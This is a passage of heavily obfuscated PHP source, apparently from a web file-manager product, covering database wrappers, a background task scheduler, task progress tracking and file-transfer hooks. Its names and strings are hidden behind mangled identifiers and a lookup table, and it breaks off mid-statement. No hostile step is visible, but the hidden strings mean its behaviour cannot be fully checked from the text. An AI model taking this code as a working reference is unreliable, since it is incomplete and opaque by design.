$÷Ğ˜ŞÚ¨[357]) { $‘ş®ºæ = $this->escapeString($‘ş®ºæ[1]); } elseif (is_array($‘ş®ºæ)) { $‘ş®ºæ = array_map(array($this, $÷Ğ˜ŞÚ¨[1011]), $‘ş®ºæ); } elseif (is_bool($‘ş®ºæ)) { $‘ş®ºæ = $‘ş®ºæ ? $÷Ğ˜ŞÚ¨[101] : $÷Ğ˜ŞÚ¨[229]; } elseif (is_null($‘ş®ºæ)) { $‘ş®ºæ = $÷Ğ˜ŞÚ¨[116]; } return $‘ş®ºæ; } public function getLastInsertId() { $šÈµÛ•¯ =& $_SERVER[Ñ¯©ç]; switch ($this->dbType) { case $šÈµÛ•¯[997]: case $šÈµÛ•¯[989]: case $šÈµÛ•¯[970]: case $šÈµÛ•¯[988]: case $šÈµÛ•¯[972]: case $šÈµÛ•¯[1000]: return $this->_linkID->lastInsertId(); case $šÈµÛ•¯[971]: case $šÈµÛ•¯[973]: $¦èƒ™ = $this->table; $¨õ†áÆé = $this->query("\123\x45\114\105\103\124\x20{$¦èƒ™}\x2e\143\165\162\162\x76\x61\154\40\143\165\x72\162\166\x61\x6c\40\x46\x52\117\115\40\144\x75\x61\154"); return $¨õ†áÆé ? $¨õ†áÆé[0][$šÈµÛ•¯[1012]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÂÈ„¤î) { $ıîß÷‡Õ =& $_SERVER[Ñ¯©ç]; if (!CacheLock::fileLock($ıîß÷‡Õ[13])) { return !1; } $Ø‚øÏò = parent::query($ÂÈ„¤î); CacheLock::fileUnLock($ıîß÷‡Õ[13]); return $Ø‚øÏò; } public function execute($èßµ©‚£) { $ïôÈ²„€ =& $_SERVER[Ñ¯©ç]; if (!CacheLock::fileLock($ïôÈ²„€[13])) { return !1; } $¡Öì±Û… = parent::execute($èßµ©‚£); CacheLock::fileUnLock($ïôÈ²„€[13]); return $¡Öì±Û…; } } class DbSqlite3 extends DbSqlite3Base { public function query($­¯ò©¨ã) { $Çíï°î³ =& $_SERVER[Ñ¯©ç]; if (!CacheLock::fileLock($Çíï°î³[13])) { return !1; } $„İ€·Ò = parent::query($­¯ò©¨ã); CacheLock::fileUnLock($Çíï°î³[13]); return $„İ€·Ò; } public function execute($õ·¹ëÏæ) { $ŒÍÂ¬·¡ =& $_SERVER[Ñ¯©ç]; if (!CacheLock::fileLock($ŒÍÂ¬·¡[13])) { return !1; } $”Ä€ ƒ = parent::execute($õ·¹ëÏæ); CacheLock::fileUnLock($ŒÍÂ¬·¡[13]); return $”Ä€ ƒ; } } goto dÄ ˆ„Ê§„; F¹ŸöÆŠ¨: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ºáµù¸ =& $_SERVER[Ñ¯©ç]; if (self::valueGet($ºáµù¸[803]) != $ºáµù¸[101]) { return; } if (self::valueGet($ºáµù¸[1707]) == $ºáµù¸[101]) { $öÎÀ‚ø© = self::valueGet($ºáµù¸[1708]); if (time() - $öÎÀ‚ø© > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ºáµù¸[1707], $ºáµù¸[101]); self::log($ºáµù¸[1709] . ACTION . $ºáµù¸[1710]); Hook::bind($ºáµù¸[1711], $ºáµù¸[1712]); $ŒŸ¿¨¾ê = 0; while (!0) { self::cacheClear(); if (self::valueGet($ºáµù¸[803]) != $ºáµù¸[101]) { self::valueSet($ºáµù¸[1707], $ºáµù¸[229]); self::log($ºáµù¸[1713]); die; } $šşäÕªÙ = time(); if ($šşäÕªÙ - $ŒŸ¿¨¾ê >= 60) { self::valueSet(array($ºáµù¸[1707] => $ºáµù¸[101], $ºáµù¸[1708] => $šşäÕªÙ)); $ŒŸ¿¨¾ê = $šşäÕªÙ; } if (!file_exists(USER_SYSTEM . $ºáµù¸[1714])) { self::valueSet(array($ºáµù¸[1707] => $ºáµù¸[229], $ºáµù¸[803] => $ºáµù¸[229])); self::log($ºáµù¸[1715]); die; } $ûÒ§•€ó = file_get_contents(BASIC_PATH . $ºáµù¸[1716]); $ğ£½ª¸ì = KOD_VERSION . $ºáµù¸[10] . KOD_VERSION_BUILD; $ñ­éş¯ = match_text($ûÒ§•€ó, $ºáµù¸[1717]) . $ºáµù¸[10] . match_text($ûÒ§•€ó, $ºáµù¸[1718]); if ($ñ­éş¯ != $ğ£½ª¸ì) { self::restart(); self::log("\163\x74\x6f\x70\x65\x64\56\133\166\145\162\x73\x69\x6f\x6e\x20\165\160\144\x61\164\x65\x3b{$versionNow}\40\75\76\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $óÃ¥Àùş =& $_SERVER[Ñ¯©ç]; http_close(); $GLOBALS[$óÃ¥Àùş[1719]] = 1; $_SERVER[$óÃ¥Àùş[1720]] = $óÃ¥Àùş[1721]; $_COOKIE = array(); $GLOBALS[$óÃ¥Àùş[1722]] = 1; $GLOBALS[$óÃ¥Àùş[1723]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $íèÇ¨ÈÛ =& $_SERVER[Ñ¯©ç]; http_close(); self::valueSet($íèÇ¨ÈÛ[803], $íèÇ¨ÈÛ[229]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($íèÇ¨ÈÛ[1707] => $íèÇ¨ÈÛ[229], $íèÇ¨ÈÛ[803] => $íèÇ¨ÈÛ[101])); self::log($íèÇ¨ÈÛ[1724]); } public static function taskSwitch() { $øÁ”Ÿ½¹ =& $_SERVER[Ñ¯©ç]; $şƒµÛ»ã = self::valueGet($øÁ”Ÿ½¹[803]) == $øÁ”Ÿ½¹[101] ? $øÁ”Ÿ½¹[229] : $øÁ”Ÿ½¹[101]; self::valueSet($øÁ”Ÿ½¹[803], $şƒµÛ»ã); } public static function shutdownEvent() { $ÒÙºÒ÷ğ =& $_SERVER[Ñ¯©ç]; self::valueSet($ÒÙºÒ÷ğ[1707], $ÒÙºÒ÷ğ[229]); self::log($ÒÙºÒ÷ğ[1725]); } public static function config($™Ú¿ë†, $Ï˜ƒ—ºì) { self::valueSet($_SERVER[Ñ¯©ç][803], $™Ú¿ë†); } private static function taskRunAll() { $åñİŠÈ‰ =& $_SERVER[Ñ¯©ç]; $À°¤ª„Œ = timeFloat(); $¬•¾°ßÉ = Model($åñİŠÈ‰[1726])->listData(); $Æ¢ï = count($¬•¾°ßÉ); for ($°ÄŠËà³ = 0; $°ÄŠËà³ < $Æ¢ï; $°ÄŠËà³++) { $¤Û­‚éƒ = $¬•¾°ßÉ[$°ÄŠËà³]; if (!$¤Û­‚éƒ[$åñİŠÈ‰[458]] || $¤Û­‚éƒ[$åñİŠÈ‰[1727]] != $åñİŠÈ‰[101]) { continue; } if (!self::taskTimeCheck($¤Û­‚éƒ)) { continue; } self::taskRun($¤Û­‚éƒ); } Hook::trigger($åñİŠÈ‰[1728]); self::taskQueueRun($À°¤ª„Œ); } private static function taskQueueRun($ çäÆ§Ñ) { $Œõö†ã› = 10; while (!0) { $Şíøö©Ğ = TaskQueue::run(); if ($Şíøö©Ğ === !1) { break; } if (timeFloat() - $ çäÆ§Ñ >= $Œõö†ã›) { break; } } } private static function taskTimeCheck($¨ÁÜé•Ô) { $™š‹üÖü =& $_SERVER[Ñ¯©ç]; $„÷’¯º = json_decode($¨ÁÜé•Ô[$™š‹üÖü[207]], !0); $ß¸Ÿ½»ó = intval($¨ÁÜé•Ô[$™š‹üÖü[1708]]); $¤¿ş£Ó˜ = strtotime($™š‹üÖü[1729] . $„÷’¯º[$™š‹üÖü[1730]] . $™š‹üÖü[1731]) - strtotime($™š‹üÖü[1732]); $ÚÉ¥³ã = time() - strtotime(date($™š‹üÖü[1733]) . $™š‹üÖü[1734]); $ÔÜ¬Ï­„ = $ÚÉ¥³ã >= $¤¿ş£Ó˜ && $ÚÉ¥³ã <= $¤¿ş£Ó˜ + 3600; switch ($„÷’¯º[$™š‹üÖü[33]]) { case $™š‹üÖü[1735]: if (time() - $ß¸Ÿ½»ó < 3600 * 24 * 30) { return !1; } if ($„÷’¯º[$™š‹üÖü[1735]] == date($™š‹üÖü[1736]) && $ÔÜ¬Ï­„) { return !0; } break; case $™š‹üÖü[1737]: if (time() - $ß¸Ÿ½»ó < 3600 * 24 * 7) { return !1; } $¨Ä¬Ìûë = date($™š‹üÖü[1738]) == 0 ? 7 : date($™š‹üÖü[1738]); if ($„÷’¯º[$™š‹üÖü[1737]] == $¨Ä¬Ìûë && $ÔÜ¬Ï­„) { return !0; } break; case $™š‹üÖü[1730]: if (time() - $ß¸Ÿ½»ó < 3600 * 24) { return !1; } if ($ÔÜ¬Ï­„) { return !0; } break; case $™š‹üÖü[1739]: if (time() - $ß¸Ÿ½»ó >= floatval($„÷’¯º[$™š‹üÖü[1739]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÎÕâ”× =& $_SERVER[Ñ¯©ç]; static $ÎóíŠ‡º = 0; $È´•Úç = 300; if (!$ÎóíŠ‡º) { $ÎóíŠ‡º = time(); } if (time() - $ÎóíŠ‡º < $È´•Úç) { return; } $ÎóíŠ‡º = time(); $ĞÇêëè¾ = Model($ÎÕâ”×[561])->db($ÎÕâ”×[12]); if ($ĞÇêëè¾) { $ĞÇêëè¾->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÎÕâ”×[1740], $ÎÕâ”×[1741]); die; } } public static function taskRun($šúÎÍÌ’) { $¤Ş×’µ€ =& $_SERVER[Ñ¯©ç]; self::log($¤Ş×’µ€[1742] . $šúÎÍÌ’[$¤Ş×’µ€[458]] . $¤Ş×’µ€[1743] . $šúÎÍÌ’[$¤Ş×’µ€[32]] . $¤Ş×’µ€[1744] . $šúÎÍÌ’[$¤Ş×’µ€[1745]]); Model($¤Ş×’µ€[1726])->run($šúÎÍÌ’[$¤Ş×’µ€[458]]); $ÜÑäœ«Ê = timeFloat(); $İÇÛÊ = $¤Ş×’µ€[12]; switch ($šúÎÍÌ’[$¤Ş×’µ€[33]]) { case $¤Ş×’µ€[367]: $ˆõÌ² = url_request($šúÎÍÌ’[$¤Ş×’µ€[1745]], $¤Ş×’µ€[262], !1, !1, !1, !1, 10); if ($ˆõÌ²[$¤Ş×’µ€[803]]) { $İÇÛÊ = strlen($ˆõÌ²[$¤Ş×’µ€[1259]]); } break; case $¤Ş×’µ€[261]: $İÇÛÊ = Hook::apply($šúÎÍÌ’[$¤Ş×’µ€[1745]]); default: break; } Model($¤Ş×’µ€[1746])->add(array($¤Ş×’µ€[1747] => $¤Ş×’µ€[12], $¤Ş×’µ€[1748] => $¤Ş×’µ€[229], $¤Ş×’µ€[33] => $¤Ş×’µ€[1749] . $šúÎÍÌ’[$¤Ş×’µ€[458]], $¤Ş×’µ€[1750] => json_encode(array($¤Ş×’µ€[32] => $šúÎÍÌ’[$¤Ş×’µ€[32]], $¤Ş×’µ€[1751] => timeFloat() - $ÜÑäœ«Ê, $¤Ş×’µ€[353] => $İÇÛÊ)))); $ÔØ¡Š¤™ = $İÇÛÊ ? $¤Ş×’µ€[1752] . $İÇÛÊ : $¤Ş×’µ€[12]; self::log($¤Ş×’µ€[1753] . $šúÎÍÌ’[$¤Ş×’µ€[458]] . $¤Ş×’µ€[178] . $ÔØ¡Š¤™); return !0; } public static function valueGet($ÎıÑí) { $ù—ğ“õ‚ =& $_SERVER[Ñ¯©ç]; $ç§­ŞØ© = $ù—ğ“õ‚[1754]; $à‹’³ïá = Model($ù—ğ“õ‚[491])->get($ÎıÑí, $ç§­ŞØ©); if (is_null($à‹’³ïá)) { Model($ù—ğ“õ‚[491])->set($ù—ğ“õ‚[803], $ù—ğ“õ‚[101], $ç§­ŞØ©); Model($ù—ğ“õ‚[491])->set($ù—ğ“õ‚[1707], $ù—ğ“õ‚[229], $ç§­ŞØ©); $à‹’³ïá = Model($ù—ğ“õ‚[491])->get($ÎıÑí, $ç§­ŞØ©); } return $à‹’³ïá; } private static function valueSet($†€—àÀ, $ï¾ë€ˆÍ = false) { $•™ºŸÈ =& $_SERVER[Ñ¯©ç]; $¢ÆËá›İ = $•™ºŸÈ[1755]; CacheLock::lock($¢ÆËá›İ); $ÆŞèƒæ = Model($•™ºŸÈ[491])->set($†€—àÀ, $ï¾ë€ˆÍ, $•™ºŸÈ[1754]); CacheLock::unlock($¢ÆËá›İ); return $ÆŞèƒæ; } protected static function log($©¥Ç‘‹¸) { write_log($©¥Ç‘‹¸, $_SERVER[Ñ¯©ç][1741]); } private static function cacheClear() { $Íú‘®ä =& $_SERVER[Ñ¯©ç]; Cache::clearMemory(Model($Íú‘®ä[491])->cacheKey($Íú‘®ä[1754])); Cache::clearMemory(Model($Íú‘®ä[491])->cacheKey($Íú‘®ä[1756])); Model($Íú‘®ä[1726])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\162\x75\156\156\151\x6e\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($­İˆ¾Õ, $‘…åÎı = '', $—ö†İÀå = 0, $ûÛ¼ = '') { $Æ•†İÌ =& $_SERVER[Ñ¯©ç]; if (self::get($­İˆ¾Õ)) { return; } $this->task = array($Æ•†İÌ[458] => $­İˆ¾Õ, $Æ•†İÌ[1757] => USER_ID, $Æ•†İÌ[1647] => $ûÛ¼, $Æ•†İÌ[509] => $Æ•†İÌ[12], $Æ•†İÌ[33] => $‘…åÎı, $Æ•†İÌ[1118] => $Æ•†İÌ[12], $Æ•†İÌ[1116] => $—ö†İÀå, $Æ•†İÌ[1758] => 0, $Æ•†İÌ[1759] => 0, $Æ•†İÌ[1760] => 0, $Æ•†İÌ[1761] => timeFloat(), $Æ•†İÌ[1762] => 0, $Æ•†İÌ[1763] => 0, $Æ•†İÌ[1764] => 0, $Æ•†İÌ[1765] => 0, $Æ•†İÌ[803] => $Æ•†İÌ[1707]); $GLOBALS[$Æ•†İÌ[1766]] = 1; Hook::bind($Æ•†İÌ[1711], array($this, $Æ•†İÌ[1767])); Hook::bind($Æ•†İÌ[1768], array($this, $Æ•†İÌ[1769])); $this->startAfter(); Hook::trigger($Æ•†İÌ[1770], $this->task); $this->task[$Æ•†İÌ[1763]] = timeFloat(); } public function end($¤è—×Ùš = '') { $çÉ£­Å× =& $_SERVER[Ñ¯©ç]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$çÉ£­Å×[1763]]) { self::valueSet($this->task[$çÉ£­Å×[458]], !1); } $this->isEnd = !0; if ($¤è—×Ùš) { $this->task[$çÉ£­Å×[509]] = $¤è—×Ùš; } self::log($çÉ£­Å×[1771] . $this->task[$çÉ£­Å×[458]] . $çÉ£­Å×[1772] . sprintf($çÉ£­Å×[903], timeFloat() - $this->task[$çÉ£­Å×[1761]]) . $çÉ£­Å×[1773]); Hook::unbind($çÉ£­Å×[1711], array($this, $çÉ£­Å×[1767])); Hook::unbind($çÉ£­Å×[1768], array($this, $çÉ£­Å×[1769])); $this->endAfter(); $È£§ì°Î = $this->task; $this->task = !1; Hook::trigger($çÉ£­Å×[1774], $È£§ì°Î); } public function update($ïÈ«”Èã = 0, $ê³ş³Åõ = false) { $€—Ö§” =& $_SERVER[Ñ¯©ç]; $’ÉäÛ§÷ =& $this->task; if (!$’ÉäÛ§÷) { return; } $’ÉäÛ§÷[$€—Ö§”[1758]] += $ïÈ«”Èã; $’ÉäÛ§÷[$€—Ö§”[1762]] = timeFloat(); if ($’ÉäÛ§÷[$€—Ö§”[1116]]) { if ($’ÉäÛ§÷[$€—Ö§”[1116]] < $’ÉäÛ§÷[$€—Ö§”[1758]]) { $’ÉäÛ§÷[$€—Ö§”[1116]] = $’ÉäÛ§÷[$€—Ö§”[1758]]; } $¬èµ”öâ = timeFloat() - $’ÉäÛ§÷[$€—Ö§”[1761]] - $’ÉäÛ§÷[$€—Ö§”[1764]]; if ($¬èµ”öâ <= 0) { $¬èµ”öâ = 0.001; } $’ÉäÛ§÷[$€—Ö§”[1759]] = $’ÉäÛ§÷[$€—Ö§”[1758]] / $’ÉäÛ§÷[$€—Ö§”[1116]]; $’ÉäÛ§÷[$€—Ö§”[1760]] = $’ÉäÛ§÷[$€—Ö§”[1758]] / $¬èµ”öâ; if ($’ÉäÛ§÷[$€—Ö§”[1759]] > 0) { $’ÉäÛ§÷[$€—Ö§”[1765]] = $¬èµ”öâ * (1 - $’ÉäÛ§÷[$€—Ö§”[1759]]) / $’ÉäÛ§÷[$€—Ö§”[1759]]; } $’ÉäÛ§÷[$€—Ö§”[1765]] = $’ÉäÛ§÷[$€—Ö§”[1765]] <= 0 ? 0 : $’ÉäÛ§÷[$€—Ö§”[1765]]; } $this->updateAfter(); $ãä’‡Ë = 0.2; if (timeFloat() - $’ÉäÛ§÷[$€—Ö§”[1763]] < $ãä’‡Ë && !$ê³ş³Åõ) { return; } $ığÙ£ªÕ = self::get($’ÉäÛ§÷[$€—Ö§”[458]]); $À£ÌÔ = $ığÙ£ªÕ[$€—Ö§”[803]]; if ($À£ÌÔ == self::STATYS_KILL) { $ÕëéñÄİ = array($€—Ö§”[1775] => LNG($€—Ö§”[1776]), $€—Ö§”[1269] => !1); Cache::set($€—Ö§”[1777] . $this->task[$€—Ö§”[458]], $ÕëéñÄİ, 30); $this->onKill(); $this->end(); die; } else { if ($À£ÌÔ == self::STATYS_STOP) { $ˆáÊŞÃ = 2; $ığÙ£ªÕ[$€—Ö§”[1764]] += $ˆáÊŞÃ; self::valueSet($’ÉäÛ§÷[$€—Ö§”[458]], $ığÙ£ªÕ); sleep($ˆáÊŞÃ); $this->update(); return; } } $’ÉäÛ§÷[$€—Ö§”[803]] = $À£ÌÔ ? $À£ÌÔ : $’ÉäÛ§÷[$€—Ö§”[803]]; $’ÉäÛ§÷[$€—Ö§”[1764]] = $ığÙ£ªÕ[$€—Ö§”[1764]] ? $ığÙ£ªÕ[$€—Ö§”[1764]] : 0; $’ÉäÛ§÷[$€—Ö§”[1763]] = timeFloat(); Hook::trigger($€—Ö§”[1778], $’ÉäÛ§÷); self::valueSet($’ÉäÛ§÷[$€—Ö§”[458]], $’ÉäÛ§÷); } public function onKillSet($†¿à„Èû, $²ÎïÈÛÔ = array()) { $this->onKillCall = array($†¿à„Èû, $²ÎïÈÛÔ); } public function onKill() { $éßòé… =& $_SERVER[Ñ¯©ç]; self::log($éßòé…[1771] . $this->task[$éßòé…[458]] . $éßòé…[1779]); Hook::trigger($éßòé…[1780], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ãè˜©¸‘) { $ÌÏ€µˆ” =& $_SERVER[Ñ¯©ç]; Cache::set($ÌÏ€µˆ”[1777] . $this->task[$ÌÏ€µˆ”[458]], $ãè˜©¸‘, 60); return $ãè˜©¸‘; } public static function get($¸ş¶Ğ¯Ú) { $Õ°ã•€€ =& $_SERVER[Ñ¯©ç]; $ê„îÌÖó = self::valueGet($¸ş¶Ğ¯Ú); if (is_array($ê„îÌÖó) && $ê„îÌÖó[$Õ°ã•€€[1781]]) { $‚‡òà”ø = ActionApply($ê„îÌÖó[$Õ°ã•€€[1781]], array($ê„îÌÖó)); $ê„îÌÖó = is_array($‚‡òà”ø) ? $‚‡òà”ø : $ê„îÌÖó; } return $ê„îÌÖó; } public static function listData() { $ú÷•Ñ¼ = self::valueGet(); return array_sort_by($ú÷•Ñ¼, $_SERVER[Ñ¯©ç][1761], !0); } public static function kill($ùøˆ´½É) { return self::changeStatus($ùøˆ´½É, self::STATYS_KILL); } public static function stop($¥ÁÑÜ÷†) { return self::changeStatus($¥ÁÑÜ÷†, self::STATYS_STOP); } public static function restart($¿ËâªÕ) { return self::changeStatus($¿ËâªÕ, self::STATYS_RUNNING); } public static function killAll() { $ÀÙÂ•À =& $_SERVER[Ñ¯©ç]; $Ÿ•ú–üæ = self::listData(); foreach ($Ÿ•ú–üæ as $²«ÃßªÅ) { self::kill($²«ÃßªÅ[$ÀÙÂ•À[458]]); } sleep(2); foreach ($Ÿ•ú–üæ as $²«ÃßªÅ) { self::valueSet($²«ÃßªÅ[$ÀÙÂ•À[458]], !1); } } private static function changeStatus($¢™­Ÿ¼º, $—×Í§¦) { $ıÙşÚªÉ =& $_SERVER[Ñ¯©ç]; $–İ—ÛéÃ = self::valueGet($¢™­Ÿ¼º); if (!$–İ—ÛéÃ) { return !1; } $–İ—ÛéÃ[$ıÙşÚªÉ[803]] = $—×Í§¦; self::valueSet($¢™­Ÿ¼º, $–İ—ÛéÃ); self::log($ıÙşÚªÉ[1782] . $–İ—ÛéÃ[$ıÙşÚªÉ[458]] . $ıÙşÚªÉ[1783] . $—×Í§¦); return !0; } public static function valueGet($†Èºú“î = false) { $»Ñó‚Ë  =& $_SERVER[Ñ¯©ç]; if ($†Èºú“î) { $‹Àı¿± = Model($»Ñó‚Ë [503])->where(array($»Ñó‚Ë [107] => $†Èºú“î, $»Ñó‚Ë [33] => $»Ñó‚Ë [1125]))->find(); return $‹Àı¿± ? json_decode($‹Àı¿±[$»Ñó‚Ë [434]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($­ÙÅÔÁò = false) { $ıÖƒ¼Ä =& $_SERVER[Ñ¯©ç]; $¿¥Ó‡é¿ = array($ıÖƒ¼Ä[33] => $ıÖƒ¼Ä[1125]); if ($­ÙÅÔÁò) { $¿¥Ó‡é¿[$ıÖƒ¼Ä[1757]] = $­ÙÅÔÁò; } $§Ãâàè = Model($ıÖƒ¼Ä[503])->where($¿¥Ó‡é¿)->select(); $§Ãâàè = $§Ãâàè ? $§Ãâàè : array(); foreach ($§Ãâàè as $¦„¦¯‘¿ => $“¢‘¹²ı) { $§Ãâàè[$¦„¦¯‘¿] = json_decode($“¢‘¹²ı[$ıÖƒ¼Ä[434]], !0); } return $§Ãâàè; } public static function valueSet($»âİ¬òß, $¡ĞıÜÕ±) { $òËÛ²½Œ =& $_SERVER[Ñ¯©ç]; if (!$¡ĞıÜÕ±) { return Model($òËÛ²½Œ[503])->where(array($òËÛ²½Œ[107] => $»âİ¬òß, $òËÛ²½Œ[33] => $òËÛ²½Œ[1125]))->delete(); } $á´Õ‡÷Î = json_encode($¡ĞıÜÕ±); if (!$á´Õ‡÷Î) { ob_start(); var_dump($¡ĞıÜÕ±); $Óïû˜ÏÜ = ob_get_clean(); self::log($òËÛ²½Œ[1784] . json_encode_force($Óïû˜ÏÜ)); } if (!$»âİ¬òß || !$¡ĞıÜÕ±[$òËÛ²½Œ[458]]) { return !1; } $äÔÒúı = array($òËÛ²½Œ[33] => $òËÛ²½Œ[1125], $òËÛ²½Œ[1757] => USER_ID, $òËÛ²½Œ[107] => $»âİ¬òß, $òËÛ²½Œ[434] => $á´Õ‡÷Î); $¼Œİ—ªƒ = $òËÛ²½Œ[1785]; CacheLock::lock($¼Œİ—ªƒ); Model($òËÛ²½Œ[503])->add($äÔÒúı, array(), !0); CacheLock::unlock($¼Œİ—ªƒ); } public static function log($áş•»àÁ) { if (!GLOBAL_DEBUG) { return; } write_log($áş•»àÁ, $_SERVER[Ñ¯©ç][1786]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÏÓœ«×¹ =& $_SERVER[Ñ¯©ç]; $¢é¶“õ˜ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÏÓœ«×¹[1787], array($this, $ÏÓœ«×¹[1788])); Hook::bind($ÏÓœ«×¹[1280], array($this, $ÏÓœ«×¹[1789])); Hook::bind($ÏÓœ«×¹[1790], array($this, $ÏÓœ«×¹[1791])); Hook::bind($ÏÓœ«×¹[651], array($this, $ÏÓœ«×¹[1792])); Hook::bind($ÏÓœ«×¹[652], array($this, $ÏÓœ«×¹[1793])); Hook::bind($ÏÓœ«×¹[658], array($this, $ÏÓœ«×¹[1794])); Hook::bind($ÏÓœ«×¹[659], array($this, $ÏÓœ«×¹[1795])); Hook::bind($ÏÓœ«×¹[654], array($this, $ÏÓœ«×¹[1796])); Hook::bind($ÏÓœ«×¹[656], array($this, $ÏÓœ«×¹[1797])); Hook::bind($ÏÓœ«×¹[620], array($this, $ÏÓœ«×¹[1798])); Hook::bind($ÏÓœ«×¹[617], array($this, $ÏÓœ«×¹[1798])); Hook::bind($ÏÓœ«×¹[622], array($this, $ÏÓœ«×¹[1798])); Hook::bind($ÏÓœ«×¹[624], array($this, $ÏÓœ«×¹[1798])); Hook::bind($ÏÓœ«×¹[626], array($this, $ÏÓœ«×¹[1798])); Hook::bind($ÏÓœ«×¹[1799], array($this, $ÏÓœ«×¹[1800])); Hook::bind($ÏÓœ«×¹[642], array($this, $ÏÓœ«×¹[1801])); $this->sourceModelCopyFlag = !1; Hook::bind($ÏÓœ«×¹[1802], array($this, $ÏÓœ«×¹[1803])); Hook::bind($ÏÓœ«×¹[1804], array($this, $ÏÓœ«×¹[1805])); Hook::bind($ÏÓœ«×¹[1806], array($this, $ÏÓœ«×¹[1807])); $¢é¶“õ˜[$ÏÓœ«×¹[1808]] = LNG($ÏÓœ«×¹[1809]); $¢é¶“õ˜[$ÏÓœ«×¹[1810]] = 0; $¢é¶“õ˜[$ÏÓœ«×¹[1811]] = 0; $¢é¶“õ˜[$ÏÓœ«×¹[1118]] = $ÏÓœ«×¹[12]; $¢é¶“õ˜[$ÏÓœ«×¹[1812]] = $ÏÓœ«×¹[12]; $¢é¶“õ˜[$ÏÓœ«×¹[1813]] = 0; $¢é¶“õ˜[$ÏÓœ«×¹[1814]] = 0; $¢é¶“õ˜[$ÏÓœ«×¹[1815]] = 0; if (!$¢é¶“õ˜[$ÏÓœ«×¹[1647]]) { $¢é¶“õ˜[$ÏÓœ«×¹[1647]] = LNG($ÏÓœ«×¹[1816]); } } protected function endAfter() { $ÆáéÒåá =& $_SERVER[Ñ¯©ç]; Hook::unbind($ÆáéÒåá[1787], array($this, $ÆáéÒåá[1788])); Hook::unbind($ÆáéÒåá[1280], array($this, $ÆáéÒåá[1789])); Hook::unbind($ÆáéÒåá[1790], array($this, $ÆáéÒåá[1791])); Hook::unbind($ÆáéÒåá[651], array($this, $ÆáéÒåá[1792])); Hook::unbind($ÆáéÒåá[652], array($this, $ÆáéÒåá[1793])); Hook::unbind($ÆáéÒåá[658], array($this, $ÆáéÒåá[1794])); Hook::unbind($ÆáéÒåá[659], array($this, $ÆáéÒåá[1795])); Hook::unbind($ÆáéÒåá[654], array($this, $ÆáéÒåá[1796])); Hook::unbind($ÆáéÒåá[656], array($this, $ÆáéÒåá[1797])); Hook::unbind($ÆáéÒåá[620], array($this, $ÆáéÒåá[1798])); Hook::unbind($ÆáéÒåá[617], array($this, $ÆáéÒåá[1798])); Hook::unbind($ÆáéÒåá[622], array($this, $ÆáéÒåá[1798])); Hook::unbind($ÆáéÒåá[624], array($this, $ÆáéÒåá[1798])); Hook::unbind($ÆáéÒåá[626], array($this, $ÆáéÒåá[1798])); Hook::unbind($ÆáéÒåá[1799], array($this, $ÆáéÒåá[1800])); Hook::unbind($ÆáéÒåá[642], array($this, $ÆáéÒåá[1801])); Hook::unbind($ÆáéÒåá[1802], array($this, $ÆáéÒåá[1803])); Hook::unbind($ÆáéÒåá[1804], array($this, $ÆáéÒåá[1805])); Hook::unbind($ÆáéÒåá[1806], array($this, $ÆáéÒåá[1807])); } public function copyMoveStart($‡ÏÁÆ±ş, $ãµÑ¿‹Í, $ï‚³É¬ú, $êÑ÷½‰) { $”ŸŞõËÌ =& $_SERVER[Ñ¯©ç]; self::log($”ŸŞõËÌ[1817] . $ãµÑ¿‹Í . $”ŸŞõËÌ[83] . $êÑ÷½‰); $¥…¯ğ  = rtrim(TEMP_FILES, $”ŸŞõËÌ[8]); if (substr($ãµÑ¿‹Í, 0, strlen($¥…¯ğ )) == $¥…¯ğ ) { return; } if (substr($êÑ÷½‰, 0, strlen($¥…¯ğ )) == $¥…¯ğ ) { return; } $šÒ©Ôä =& $this->task; $šÒ©Ôä[$”ŸŞõËÌ[1818]] = KodIO::transferType($‡ÏÁÆ±ş, $ï‚³É¬ú); $this->update(); } public function updateAfter() { $ˆ—¬ş´¸ =& $_SERVER[Ñ¯©ç]; $úôşÄ¯ =& $this->task; if (!$úôşÄ¯[$ˆ—¬ş´¸[816]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($úôşÄ¯[$ˆ—¬ş´¸[1818]] == $ˆ—¬ş´¸[1372]) { return; } self::updateTask($úôşÄ¯); } private static function updateTask(&$éÒÆØÊ) { $îÔ¨õ¦± =& $_SERVER[Ñ¯©ç]; if ($éÒÆØÊ[$îÔ¨õ¦±[1818]] == $îÔ¨õ¦±[1251] || $éÒÆØÊ[$îÔ¨õ¦±[1818]] == $îÔ¨õ¦±[120]) { if ($éÒÆØÊ[$îÔ¨õ¦±[1812]]) { $éÒÆØÊ[$îÔ¨õ¦±[1815]] = $éÒÆØÊ[$îÔ¨õ¦±[1814]] + $éÒÆØÊ[$îÔ¨õ¦±[1811]]; } } else { if ($éÒÆØÊ[$îÔ¨õ¦±[1818]] == $îÔ¨õ¦±[1373]) { if ($éÒÆØÊ[$îÔ¨õ¦±[1812]] == $îÔ¨õ¦±[1251]) { $éÒÆØÊ[$îÔ¨õ¦±[1815]] = $éÒÆØÊ[$îÔ¨õ¦±[1814]] + $éÒÆØÊ[$îÔ¨õ¦±[1811]] * 0.5; } else { if ($éÒÆØÊ[$îÔ¨õ¦±[1812]] == $îÔ¨õ¦±[120]) { $éÒÆØÊ[$îÔ¨õ¦±[1815]] = $éÒÆØÊ[$îÔ¨õ¦±[1814]] + 